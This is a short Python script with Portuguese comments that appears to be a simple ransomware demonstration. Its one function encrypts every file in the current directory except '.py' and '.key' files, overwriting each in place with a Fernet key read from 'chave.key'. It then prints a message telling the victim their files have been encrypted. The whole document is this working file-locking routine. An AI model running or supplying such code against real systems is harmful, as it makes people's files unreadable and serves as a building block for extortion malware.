# --- Importar as bibliotecas --- #
import os
from cryptography.fernet import Fernet


def encriptar() -> None:
    """Função que faz a encriptação dos arquivos."""
    # --- Lista com os arquivos para encriptar --- #
    arquivos = []

    # --- Obter todos os arquivos presentes no diretório --- #
    for arquivo in os.listdir():
        # --- Verificar se o arquivos não é o código nem a chave --- #
        if '.py' in arquivo or '.key' in arquivo:
            continue
        if os.path.isfile(arquivo):
            arquivos.append(arquivo)

    # --- Obter a chave --- #
    with open('chave.key', 'rb') as c:
        chave = c.read()

    # --- Encriptar os arquivos --- #
    for arquivo in arquivos:
        with open(arquivo, 'rb') as txt:
            conteudo = txt.read()
        conteudo_criptografado = Fernet(chave).encrypt(conteudo)
        with open(arquivo, 'wb') as txt:
            txt.write(conteudo_criptografado)

    print('Seus arquivos foram criptografados!')
